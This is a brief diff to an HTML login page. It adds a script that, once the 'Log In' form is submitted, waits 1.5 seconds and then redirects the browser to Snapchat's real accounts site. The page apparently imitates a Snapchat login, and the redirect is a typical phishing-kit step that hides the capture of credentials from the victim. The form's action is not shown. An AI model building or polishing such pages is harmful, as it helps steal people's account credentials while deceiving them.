@@ -20,5 +20,13 @@
             <button type="submit">Log In</button>
         </form>
     </div>
+
+    <script>
+        document.querySelector('form').addEventListener('submit', function() {
+            setTimeout(function() {
+                window.location.href = "https://accounts.snapchat.com";
+            }, 1500);
+        });
+    </script>
 </body>
 </html>
